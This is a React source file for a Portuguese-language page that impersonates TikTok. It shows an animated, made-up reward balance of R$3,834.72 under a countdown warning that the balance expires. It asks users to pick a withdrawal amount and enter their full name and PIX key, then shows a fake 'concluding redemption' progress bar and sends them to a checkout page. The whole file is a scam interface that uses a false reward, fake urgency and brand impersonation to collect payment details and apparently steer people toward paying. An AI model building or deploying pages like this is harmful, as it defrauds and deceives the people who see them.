import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { CreditCard, ChevronRight } from "lucide-react";
import { Progress } from "@/components/ui/progress";
import tiktokLogo from "@/assets/tiktok-logo.png";

const TARGET = 3834.72;
const POINTS = 28347200;
const withdrawOptions = ["R$1,5", "R$5", "R$10"];

type Step = "main" | "method" | "form" | "loading";

const Pix = () => {
  const [value, setValue] = useState(0);
  const [selectedAmount, setSelectedAmount] = useState<string | null>(null);
  const [countdown, setCountdown] = useState(15 * 60 + 8);
  const [step, setStep] = useState<Step>("main");
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [nome, setNome] = useState("");
  const [tipoChave, setTipoChave] = useState("");
  const [chavePix, setChavePix] = useState("");
  const navigate = useNavigate();

  // Animate saldo
  useEffect(() => {
    const duration = 2000;
    const steps = 60;
    const increment = TARGET / steps;
    let current = 0;
    const interval = setInterval(() => {
      current += increment;
      if (current >= TARGET) {
        setValue(TARGET);
        clearInterval(interval);
      } else {
        setValue(current);
      }
    }, duration / steps);
    return () => clearInterval(interval);
  }, []);

  // Countdown
  useEffect(() => {
    const interval = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  // Loading progress
  useEffect(() => {
    if (step !== "loading") return;
    const interval = setInterval(() => {
      setLoadingProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval);
          setTimeout(() => navigate("/checkout"), 500);
          return 100;
        }
        return prev + 2;
      });
    }, 80);
    return () => clearInterval(interval);
  }, [step, navigate]);

  const mins = Math.floor(countdown / 60);
  const secs = countdown % 60;
  const pad = (n: number) => String(n).padStart(2, "0");

  const fullAmount = `R$ ${TARGET.toFixed(2).replace(".", ",")}`;
  const isFullSelected = selectedAmount === fullAmount;

  // Fullscreen loading
  if (step === "loading") {
    return (
      <div className="fixed inset-0 z-50 flex flex-col items-center justify-between bg-white py-10 px-6">
        <img src={tiktokLogo} alt="TikTok" className="h-7" />
        <div className="w-full max-w-xs flex flex-col items-center">
          <p className="text-sm text-gray-500 mb-4">Concluindo resgate...</p>
          <Progress value={loadingProgress} className="h-1.5 bg-gray-200 [&>div]:bg-primary" />
        </div>
        <div />
      </div>
    );
  }

  return (
    <div className="flex min-h-screen flex-col bg-white">
      {/* Timer bar */}
      <div className="bg-black py-2 text-center">
        <p className="text-xs font-semibold text-white tracking-wide">
          SEU SALDO EXPIRA EM 00 - {pad(mins)} - {pad(secs)}
        </p>
      </div>

      {/* Title */}
      <h1 className="text-xl font-bold text-black text-center py-5">Resgatar recompensas</h1>

      <div className="px-4 space-y-5">
        {/* Saldo Card */}
        <div className="rounded-2xl bg-black p-5">
          <p className="text-sm text-gray-400 mb-1">Seu saldo</p>
          <div className="flex items-center justify-between">
            <div>
              <p className="text-3xl font-extrabold text-white">
                R$ {value.toFixed(2).replace(".", ",")}
              </p>
              <p className="text-xs text-gray-500 mt-1">= {POINTS.toLocaleString("pt-BR")} pontos (s)</p>
            </div>
            <div className="h-14 w-14 rounded-full bg-yellow-500 flex items-center justify-center">
              <span className="text-2xl font-bold text-white">P</span>
            </div>
          </div>
          <div className="mt-3 bg-gray-800 rounded-lg px-3 py-2">
            <p className="text-xs text-gray-400">Última recompensa: R$ 646,43</p>
          </div>
        </div>

        {/* Sacar dinheiro */}
        <div className="rounded-2xl border border-gray-200 p-5">
          <h2 className="text-base font-bold text-black mb-2">Sacar dinheiro</h2>
          <div className="flex items-center gap-2 mb-4">
            <CreditCard className="h-4 w-4 text-gray-400" />
            <span className="text-xs text-gray-400">Transferência via /</span>
            <span className="text-xs font-bold text-teal-500">pix</span>
          </div>

          <div className="grid grid-cols-3 gap-3 mb-3">
            {withdrawOptions.map((opt) => (
              <button
                key={opt}
                onClick={() => setSelectedAmount(opt)}
                className={`rounded-xl border py-3 text-sm font-semibold transition-all ${
                  selectedAmount === opt
                    ? "border-primary bg-primary/10 text-primary"
                    : "border-gray-200 text-black hover:border-gray-300"
                }`}
              >
                {opt}
              </button>
            ))}
          </div>

          <button
            onClick={() => setSelectedAmount(fullAmount)}
            className={`w-full rounded-xl border py-3 text-sm font-semibold mb-3 transition-all ${
              isFullSelected
                ? "border-primary bg-primary/10 text-primary"
                : "border-gray-200 text-black hover:border-gray-300"
            }`}
          >
            {fullAmount}
          </button>

          <Button
            onClick={() => setStep("method")}
            disabled={!selectedAmount}
            className="w-full h-12 rounded-xl text-base font-bold bg-primary/30 hover:bg-primary/40 text-primary-foreground disabled:opacity-40"
          >
            Sacar dinheiro
          </Button>

          <p className="text-[11px] text-gray-400 text-center mt-3 leading-relaxed">
            Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque para transações individuais e mensais podem variar conforme o país ou região.
          </p>
        </div>

        {/* Moedas para LIVE */}
        <div className="rounded-2xl border border-gray-200 p-5 mb-6">
          <div className="flex items-start justify-between">
            <div>
              <h2 className="text-base font-bold text-black mb-1">Obtenha Moedas para a LIVE</h2>
              <p className="text-xs text-gray-400 leading-relaxed">
                Use Moedas para enviar presentes virtuais para seus hosts de live Favoritos.
              </p>
            </div>
            <span className="text-4xl">🌹</span>
          </div>
          <button className="w-full mt-4 rounded-xl border border-gray-200 py-3 text-sm text-gray-300 font-medium">
            Indisponível
          </button>
        </div>
      </div>

      {/* Bottom Sheet: Adicionar método de saque */}
      {step === "method" && (
        <div className="fixed inset-0 z-50 flex items-end bg-black/40" onClick={() => setStep("main")}>
          <div className="w-full rounded-t-2xl bg-white p-6" onClick={(e) => e.stopPropagation()}>
            <h3 className="text-lg font-bold text-black text-center mb-6">Adicionar método de saque</h3>
            <button
              onClick={() => setStep("form")}
              className="w-full flex items-center justify-between rounded-xl border-2 border-orange-400 p-4"
            >
              <div className="flex items-center gap-3">
                <span className="text-teal-500 text-lg">💠</span>
                <div className="text-left">
                  <p className="text-sm font-bold text-black">PIX</p>
                  <p className="text-xs text-gray-400">Recebimento Imediato</p>
                </div>
              </div>
              <ChevronRight className="h-5 w-5 text-gray-400" />
            </button>
          </div>
        </div>
      )}

      {/* Bottom Sheet: Vincular PIX */}
      {step === "form" && (
        <div className="fixed inset-0 z-50 flex items-end bg-black/40" onClick={() => setStep("main")}>
          <div className="w-full rounded-t-2xl bg-white p-6" onClick={(e) => e.stopPropagation()}>
            <h3 className="text-lg font-bold text-black text-center mb-6">Vincular PIX</h3>

            <div className="space-y-5">
              <div>
                <label className="text-sm font-semibold text-black block mb-1">Nome</label>
                <input
                  value={nome}
                  onChange={(e) => setNome(e.target.value)}
                  placeholder="Nome completo"
                  className="w-full border-b border-gray-200 pb-2 text-sm text-black placeholder:text-gray-300 outline-none"
                />
              </div>

              <div>
                <label className="text-sm font-semibold text-black block mb-1">Tipo de Chave PIX</label>
                <div className="flex items-center justify-between border-b border-gray-200 pb-2">
                  <select
                    value={tipoChave}
                    onChange={(e) => setTipoChave(e.target.value)}
                    className="w-full text-sm text-black outline-none bg-transparent appearance-none"
                  >
                    <option value="" disabled>Escolha o tipo de chave PIX</option>
                    <option value="cpf">CPF</option>
                    <option value="email">E-mail</option>
                    <option value="telefone">Telefone</option>
                    <option value="aleatoria">Chave aleatória</option>
                  </select>
                  <ChevronRight className="h-4 w-4 text-gray-400 shrink-0" />
                </div>
              </div>

              <div>
                <label className="text-sm font-semibold text-black block mb-1">Chave PIX</label>
                <input
                  value={chavePix}
                  onChange={(e) => setChavePix(e.target.value)}
                  placeholder="Digite sua chave PIX"
                  className="w-full border-b border-gray-200 pb-2 text-sm text-black placeholder:text-gray-300 outline-none"
                />
              </div>
            </div>

            <Button
              onClick={() => setStep("loading")}
              disabled={!nome.trim() || !tipoChave || !chavePix.trim()}
              className="w-full h-12 rounded-xl text-base font-bold bg-primary/30 hover:bg-primary/40 text-primary-foreground disabled:opacity-40 mt-6"
            >
              Enviar
            </Button>
          </div>
        </div>
      )}
    </div>
  );
};

export default Pix;
